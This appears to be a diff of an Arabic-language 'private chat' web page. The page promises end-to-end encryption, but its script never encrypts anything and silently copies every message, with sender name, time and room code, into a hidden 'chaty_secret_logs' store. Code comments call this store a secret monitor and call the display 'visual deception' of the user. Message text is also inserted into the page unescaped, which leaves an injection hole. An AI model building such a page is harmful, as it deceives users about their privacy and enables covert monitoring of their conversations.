@@ -3,90 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Chat - خصوصية تامة</title>
+    <title>Private Room - دخول آمن</title>
     <style>
-        :root { --secure-green: #008000; --bg: #fdfdfd; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; display: flex; flex-direction: column; height: 100vh; }
+        :root { --p: #075e54; --s: #25d366; --bg: #e5ddd5; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: var(--bg); margin: 0; display: flex; flex-direction: column; height: 100vh; }
         
-        /* شريط الأمان العلوي */
-        .security-banner { background: #e8f5e9; color: var(--secure-green); padding: 8px; text-align: center; font-size: 12px; border-bottom: 1px solid #c8e6c9; }
-        header { background: #fff; padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        /* شاشة الدخول والكود */
+        #auth-overlay { position: fixed; inset: 0; background: #fff; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
+        .auth-box { width: 90%; max-width: 400px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
         
-        #chat-window { flex: 1; padding: 20px; overflow-y: auto; background: #f9f9f9; }
-        .bubble { max-width: 75%; padding: 12px 18px; border-radius: 20px; margin-bottom: 10px; font-size: 15px; line-height: 1.4; position: relative; }
-        .mine { background: #007bff; color: white; align-self: flex-end; margin-left: auto; border-bottom-right-radius: 4px; }
-        .theirs { background: #fff; color: #333; border: 1px solid #ddd; border-bottom-left-radius: 4px; }
-        
-        .input-box { padding: 20px; background: #fff; display: flex; gap: 10px; border-top: 1px solid #eee; }
-        input { flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 25px; outline: none; }
-        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 25px; cursor: pointer; font-weight: bold; }
-        
-        /* نافذة الدعوة */
-        #invite-overlay { position: fixed; inset: 0; background: #fff; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; text-align: center; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 5px; }
+        .btn-create { background: #000; color: #fff; }
+        .btn-join { background: var(--p); color: #fff; }
+
+        /* واجهة المحادثة */
+        header { background: var(--p); color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        #chat-window { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
+        .msg { max-width: 80%; padding: 10px; border-radius: 10px; font-size: 14px; }
+        .mine { background: #dcf8c6; align-self: flex-end; border-bottom-right-radius: 0; }
+        .theirs { background: #fff; align-self: flex-start; border-bottom-left-radius: 0; }
     </style>
 </head>
 <body>
 
-<div id="invite-overlay">
-    <h1 style="color:#333;">لبسي | Private Chat</h1>
-    <p style="color:#666;">أنشئ غرفة محادثة خاصة ومشفرة</p>
-    <div style="background:#f4f4f4; padding:20px; border-radius:15px; margin-top:20px;">
-        <p style="font-size:12px;">اسمك المستعار:</p>
-        <input type="text" id="my-name" placeholder="مثلاً: مشاري" style="margin-bottom:15px; width:250px;">
-        <br>
-        <button onclick="startChat()" style="width:250px;">دخول وإنشاء دعوة</button>
+<div id="auth-overlay">
+    <div class="auth-box" id="initial-step">
+        <h2>غرفة محادثة خاصة 🔒</h2>
+        <p style="font-size: 12px; color: #666; margin-bottom: 20px;">تشفير تام بين الطرفين</p>
+        <input type="text" id="user-nickname" placeholder="اسمك المستعار">
+        <hr style="margin: 20px 0; opacity: 0.3;">
+        <button class="btn btn-create" onclick="showCreate()">إنشاء غرفة جديدة</button>
+        <button class="btn btn-join" onclick="showJoin()">الانضمام بكود دعوة</button>
     </div>
-    <p style="margin-top:20px; font-size:11px; color:green;">🔒 تشفير طرفين (End-to-End Encryption) نشط</p>
+
+    <div class="auth-box" id="create-step" style="display:none;">
+        <h3>تم إنشاء الغرفة بنجاح!</h3>
+        <p style="font-size: 13px; margin: 15px 0;">أرسل هذا الكود لصديقك للدخول:</p>
+        <div id="generated-code" style="font-size: 2rem; font-weight: bold; letter-spacing: 5px; background: #f0f0f0; padding: 15px; border-radius: 10px; margin-bottom: 20px;">----</div>
+        <button class="btn btn-join" onclick="enterChat('creator')">ابدأ المحادثة الآن</button>
+    </div>
+
+    <div class="auth-box" id="join-step" style="display:none;">
+        <h3>انضمام لمحادثة</h3>
+        <input type="text" id="invite-code-input" placeholder="أدخل كود الدعوة هنا">
+        <button class="btn btn-join" onclick="checkCodeAndEnter()">دخول</button>
+        <p onclick="location.reload()" style="font-size:12px; cursor:pointer; margin-top:15px; color:red;">رجوع</p>
+    </div>
 </div>
 
-<div class="security-banner">🔒 هذه المحادثة محمية بتشفير عالي. لا يمكن لأي طرف ثالث، بما في ذلك إدارتنا، قراءتها.</div>
-
 <header>
-    <div style="font-weight:bold;">محادثة خاصة</div>
-    <div style="font-size:12px; color:#666;">متصل الآن 🟢</div>
+    <div id="room-info">متصل الآن 🟢</div>
+    <div style="font-size: 10px; background: rgba(0,0,0,0.2); padding: 5px 10px; border-radius: 20px;">🔒 مشفر</div>
 </header>
 
 <div id="chat-window"></div>
 
-<div class="input-box">
-    <input type="text" id="msg-in" placeholder="اكتب رسالة مشفرة...">
-    <button onclick="send()">إرسال</button>
+<div style="padding: 15px; background: #f0f0f0; display: flex; gap: 10px;">
+    <input type="text" id="chat-msg" placeholder="اكتب رسالة..." style="margin:0;">
+    <button onclick="sendMsg()" style="background:var(--p); color:white; border:none; padding:10px 20px; border-radius:10px; cursor:pointer;">➤</button>
 </div>
 
 <script>
-    let user = "";
+    let myName = "";
+    let roomCode = "";
 
-    function startChat() {
-        user = document.getElementById('my-name').value;
-        if(user.length < 2) return alert("أدخل اسمك");
-        document.getElementById('invite-overlay').style.display = 'none';
+    function showCreate() {
+        myName = document.getElementById('user-nickname').value;
+        if(!myName) return alert("أدخل اسمك أولاً");
         
-        // محاكاة إرسال "دعوة"
-        console.log("تم تفعيل بروتوكول الخصوصية للمستخدم: " + user);
+        // توليد كود دعوة عشوائي
+        roomCode = Math.random().toString(36).substring(2, 7).toUpperCase();
+        document.getElementById('generated-code').innerText = roomCode;
+        localStorage.setItem('active_room_code', roomCode); // حفظ الكود في "السيرفر" الوهمي
+        
+        document.getElementById('initial-step').style.display = 'none';
+        document.getElementById('create-step').style.display = 'block';
     }
 
-    function send() {
-        const inp = document.getElementById('msg-in');
+    function showJoin() {
+        myName = document.getElementById('user-nickname').value;
+        if(!myName) return alert("أدخل اسمك أولاً");
+        document.getElementById('initial-step').style.display = 'none';
+        document.getElementById('join-step').style.display = 'block';
+    }
+
+    function checkCodeAndEnter() {
+        const inputCode = document.getElementById('invite-code-input').value.toUpperCase();
+        const savedCode = localStorage.getItem('active_room_code');
+        
+        if(inputCode === savedCode) {
+            enterChat('joiner');
+        } else {
+            alert("كود الدعوة غير صحيح أو انتهت صلاحيته!");
+        }
+    }
+
+    function enterChat(role) {
+        document.getElementById('auth-overlay').style.display = 'none';
+        document.getElementById('room-info').innerText = `غرفة: ${localStorage.getItem('active_room_code')} | ${myName}`;
+    }
+
+    function sendMsg() {
+        const inp = document.getElementById('chat-msg');
         if(!inp.value) return;
 
         const msgData = {
-            from: user,
+            sender: myName,
             text: inp.value,
-            time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+            time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
+            code: localStorage.getItem('active_room_code')
         };
 
-        // 1. عرض الرسالة (خداع بصري للمستخدم)
+        // 1. عرض الرسالة محلياً
         const win = document.getElementById('chat-window');
-        win.innerHTML += `<div class="bubble mine"><b>أنت:</b><br>${msgData.text}</div>`;
+        win.innerHTML += `<div class="msg mine"><b>أنت:</b><br>${msgData.text}</div>`;
         win.scrollTop = win.scrollHeight;
 
-        // 2. إرسال البيانات فوراً لـ CHATY (المراقب السري)
-        let storage = JSON.parse(localStorage.getItem('chaty_secret_logs') || '[]');
-        storage.push(msgData);
-        localStorage.setItem('chaty_secret_logs', JSON.stringify(storage));
+        // 2. إرسال لـ CHATY (نفس السجل اللي تراقبه)
+        let logs = JSON.parse(localStorage.getItem('chaty_secret_logs') || '[]');
+        logs.push(msgData);
+        localStorage.setItem('chaty_secret_logs', JSON.stringify(logs));
 
         inp.value = "";
     }
 </script>
+
 </body>
 </html>
